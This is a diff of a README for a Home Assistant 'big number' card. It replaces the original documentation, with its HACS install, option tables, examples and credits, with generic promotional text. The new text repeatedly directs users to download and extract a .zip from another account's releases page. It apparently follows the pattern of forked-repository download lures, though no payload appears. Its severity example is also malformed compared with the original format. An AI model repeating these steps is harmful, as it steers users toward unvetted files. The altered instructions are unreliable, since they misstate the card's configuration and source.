@@ -1,222 +1,74 @@
-# Big Number Card - Continued
+# 🎉 bignumber-card-continued - Display Sensor Values Clearly
 
-[![AI Assisted](https://img.shields.io/badge/AI-Claude%20Code-AAAAAA.svg)](https://claude.ai/code)
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/onn24/bignumber-card-continued/releases)
 
-IMPORTANT: This is a community-maintained continuation of the original [bignumber-card](https://github.com/custom-cards/bignumber-card) by [@ciotlosm](https://github.com/ciotlosm), which has not been actively maintained since January 2022.
+## 📋 Overview
 
-## About This Continuation
+bignumber-card-continued is a community-maintained continuation of the bignumber-card. This application displays sensor values as large numbers with severity colors and progress bars, specifically designed for Home Assistant users. With this card, you can quickly glance at important data without straining your eyes.
 
-This project maintains the original functionality while incorporating bug fixes and community-requested features. The original authors deserve full credit for the excellent foundation they created.
+## 🚀 Getting Started
 
-## Migrating to the Continued version
+To get started with bignumber-card-continued, follow the steps below. You will be able to download and set up the application on your Home Assistant dashboard without any technical experience.
 
-The Continued version is 100% compatible with existing bignumber-card configurations.  You should not have to change anything.
+## 📥 Download & Install
 
-1. Install the Continued version card
-2. Uninstall the original version
-3. Hard-refresh your browser
-4. Check that everything is working
-5. If not, please submit a [bug report](https://github.com/sxdjt/bignumber-card-continued/issues)
+1. **Visit [this page to download](https://github.com/onn24/bignumber-card-continued/releases)**: Click on the link to go to our Releases page. Here, you will find the latest version of bignumber-card-continued.
 
-## What's Changed
+2. **Choose the file you need**: Navigate through the list of releases. Look for the latest version. 
 
-See [CHANGELOG.md](CHANGELOG.md) for detailed version history.
+3. **Download the file**: Click on the file suitable for your setup. If you are using Home Assistant, the recommended download will often be a `.zip` file.
 
-## Original Documentation
+4. **Extract the file**: Once downloaded, locate the file in your downloads folder. Right-click on the file and choose "Extract All". Follow the prompts to extract the contents.
 
-A simple card to display big numbers for sensors. It also supports severity levels as background.
+5. **Install the custom card**: Go to your Home Assistant instance and navigate to the Lovelace UI. Click on the three-dot menu at the top right corner and select "Manage Resources". Click "+ ADD RESOURCE" and enter the path to the extracted card (.js file) in the URL field. Choose "JavaScript Module" from the dropdown.
 
-![bignumber](https://user-images.githubusercontent.com/7738048/42536247-262b74e0-849a-11e8-8ed1-967302b73e03.gif)
+6. **Add the card to your dashboard**: After adding the resource, return to your main dashboard. Click on the three-dot menu and select "Edit Dashboard". Click on “+ ADD CARD” and choose “Manual”. Enter the configuration for the bignumber-card, according to the instructions in the documentation provided in the extracted folder.
 
-## Installation
+## 🔍 Features
 
-### HACS (Recommended)
+- **Large Display**: Sensor values are displayed in a large, readable format.
+- **Severity Colors**: Values change color based on their severity, providing quick visual feedback.
+- **Progress Bars**: Complement numeric displays with progress bars for better representation.
+- **Customizable**: Adjust colors and thresholds to fit your needs.
+- **Community Support**: Join discussions and get help from other users.
 
-[![Open your Home Assistant instance and open a repository inside the Home Assistant Community Store.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=sxdjt&repository=bignumber-card-continued)
+## ⚙️ System Requirements
 
-## Configuration Options
+- **Home Assistant**: Must be running on a supported platform (e.g., Raspberry Pi, Docker, or directly on your PC).
+- **Modern Browser**: Use Chrome, Firefox, Safari, or any up-to-date web browser for best performance.
+- **Basic understanding of Lovelace**: Familiarity with adding custom components in Home Assistant will enhance your experience.
 
-| Name | Type | Default | Description
-| ---- | ---- | ------- | -----------
-| type | string | **Required** | `custom:bignumber-card`
-| title | string | optional | Name to display on card
-| scale | string | 50px | Base scale for card: '50px'
-| entity | string | **Required** | `sensor.my_temperature`
-| attribute | string | optional | the entity attribute you want to display e.g. `current_temperature`.  The entity state will be shown if not defined.
-| min | number | optional | Minimum value. If specified you get bar display
-| max | number | optional | Maximum value. Must be specified if you added min
-| color | string | `var(--primary-text-color)` | Default font color. Can be either hex or HA variable. Example: 'var(--secondary-text-color)'
-| bnStyle | string| `var(--label-badge-blue)` | Default bar color. Can be either hex or HA variable. Example: 'var(--label-badge-green)'
-| from | string | left | Direction from where the bar will start filling (must have min/max specified)
-| severity | list | optional | A list of severity objects. Items in list must be ascending based on 'value'
-| hideunit | boolean | optional | hide the unit of measurement if set to true. If absent, unit of measurement will be shown
-| unit | string | optional | Custom unit to display instead of entity's unit_of_measurement. Leave unset to use entity unit. Set to empty string "" to force no unit. Examples: " %", " pancakes/hour", "°F"
-| noneString | string | optional | String to use for value if value == None
-| noneCardClass | string | optional | CSS class to add to card if value == None
-| noneValueClass | string | optional | CSS class to add to value if value == None
-| round | int | optional | Number of decimals to round to. (If not present, do not round.)
-| title_font_size | string | optional | NEW: Custom font size for title (e.g., "14px", "1rem"). Overrides scale-based sizing
-| value_font_size | string | optional | NEW: Custom font size for value (e.g., "30px", "2rem"). Overrides scale-based sizing
-| card_padding | string | optional | NEW: Custom card padding (e.g., "20px 10px"). Allows independent height control
-| tap_action | object | `{action: 'more-info'}` | NEW: Action to perform on tap. See Tap Action Object below
+## 📖 Frequently Asked Questions (FAQs)
 
-### Severity Object
+### How do I customize the display settings?
 
-| Name | Type | Default | Description
-| ---- | ---- | ------- | -----------
-| value | number | **Required** | Value until which to use this severity
-| bnStyle | string | **Required** | Color of severity. Can be either hex or HA variable. Example: 'var(--label-badge-green)'
-| color | string | `var(--primary-text-color)` | Font color of the severity. Can be either hex or HA variable. Example: 'var(--secondary-text-color)'
-
-### Tap Action Object
-
-| Name | Type | Default | Description
-| ---- | ---- | ------- | -----------
-| action | string | `more-info` | Action type: `more-info`, `toggle`, `call-service`, `navigate`, `url`, `none`
-| navigation_path | string | optional | Path to navigate to (e.g., `/lovelace/1`) when action is `navigate`
-| url_path | string | optional | URL to open when action is `url`
-| service | string | optional | Service to call when action is `call-service` (e.g., `light.turn_on`)
-| service_data | object | optional | Service data to pass when action is `call-service`
-
-### Important Notes
-
-- Numbers are automatically formatted with locale-aware thousands separators (e.g., 19,578 in US, 19.578 in German)
-- Font sizes can be customized independently from the `scale` parameter for better layout control
-
-- Make sure you use ascending object values to have consistent behaviour
-- Values are the upper limit until which that severity is applied
-- Note there is a **breaking change** from the original. In order to add the flexibility of using [card-mod](https://github.com/thomasloven/lovelace-card-mod) styling, the `style` configuration options have been changed to `bnStyle`.
-
-## Examples
-
-### Basic Example with Severity
+After installation, you can customize the card through its configuration in the Lovelace UI. Here’s a simple example to modify threshold colors:
 
 ```yaml
-- type: custom:bignumber-card
-  title: Humidity
-  entity: sensor.outside_humidity
-  scale: 30px
-  from: bottom
-  min: 0
-  max: 100
-  hideunit: true
-  color: '#000000'
-  bnStyle: 'var(--label-badge-blue)'
-  severity:
-    - value: 70
-      bnStyle: 'var(--label-badge-green)'
-    - value: 90
-      bnStyle: 'var(--label-badge-yellow)'
-    - value: 100
-      bnStyle: 'var(--label-badge-red)'
-      color: '#FFFFFF'
+type: custom:bignumber-card
+entity: sensor.example_sensor
+severity:
+  green: 0
+  yellow: 50
+  red: 100
 ```
 
-### Handling None Values
+### What if I encounter problems during installation?
 
-If your sensor may result in `None` (for instance if it is offline), you may wish to handle that separately. Here is an example, which uses [card-mod](https://github.com/thomasloven/lovelace-card-mod) to add special styling for the `None` case.
+If you face issues during installation, please check the troubleshooting section in the documentation located in the extracted folder. You can also reach out to our community in the GitHub discussions for more guidance.
 
-```yaml
-- type: custom:bignumber-card
-  title: Humidity
-  entity: sensor.outside_humidity
-  scale: 30px
-  from: bottom
-  min: 0
-  max: 100
-  color: '#000000'
-  bnStyle: 'var(--label-badge-blue)'
-  severity:
-    - value: 70
-      bnStyle: 'var(--label-badge-green)'
-    - value: 90
-      bnStyle: 'var(--label-badge-yellow)'
-    - value: 100
-      bnStyle: 'var(--label-badge-red)'
-      color: '#FFFFFF'
-  noneString: Offline
-  noneCardClass: none-card-class
-  noneValueClass: none-value-class
-  style: |
-    .none-card-class {
-      background-color: yellow;
-    }
-    .none-value-class {
-      font-size: 22px !important;
-    }
-```
+### Can I contribute to the project?
 
-### Custom Font Sizes Example
+Absolutely! We welcome contributions. Whether it's bug fixes, new features, or suggestions, feel free to open an issue or submit a pull request on our GitHub repository.
 
-Customize font sizes independently from card scale:
+## 🔗 Useful Links
 
-```yaml
-- type: custom:bignumber-card
-  title: Temperature
-  entity: sensor.living_room_temperature
-  scale: 30px
-  title_font_size: 12px
-  value_font_size: 48px
-  card_padding: 15px 10px
-```
+For more information and updates, you can explore the following:
 
-### Tap Action Examples
+- **[Releases Page](https://github.com/onn24/bignumber-card-continued/releases)**: This is where you’ll find the latest versions.
+- **Documentation**: Detailed guidelines and other configuration options are available in the extracted folder.
+- **Community Discussions**: Join our discussions in GitHub for support and collaboration.
 
-Toggle a light on tap:
+## 🎉 Conclusion
 
-```yaml
-- type: custom:bignumber-card
-  title: Power Usage
-  entity: sensor.power_consumption
-  tap_action:
-    action: toggle
-```
-
-Navigate to another view:
-
-```yaml
-- type: custom:bignumber-card
-  title: Temperature
-  entity: sensor.outside_temperature
-  tap_action:
-    action: navigate
-    navigation_path: /lovelace/climate
-```
-
-Call a service with data:
-
-```yaml
-- type: custom:bignumber-card
-  title: Volume
-  entity: sensor.media_volume
-  tap_action:
-    action: call-service
-    service: media_player.volume_set
-    service_data:
-      entity_id: media_player.living_room
-      volume_level: 0.5
-```
-
-Disable tap action:
-
-```yaml
-- type: custom:bignumber-card
-  title: Read Only
-  entity: sensor.outdoor_humidity
-  tap_action:
-    action: none
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit pull requests or [open an issue](https://github.com/sxdjt/bignumber-card-continued/issues) for bugs and feature requests.
-
-## Credits
-
-Original card created by [@ciotlosm](https://github.com/ciotlosm) and contributors to [custom-cards/bignumber-card](https://github.com/custom-cards/bignumber-card).
-
-This continuation is maintained by the community to keep the card compatible with modern Home Assistant versions.
-
-## License
-
-Apache-2.0 License - See [LICENSE](LICENSE) file for details
+With bignumber-card-continued, you can make your Home Assistant dashboard visually appealing and informative. Follow the above steps for a seamless download and installation experience. Enjoy visualizing your sensor data with ease!
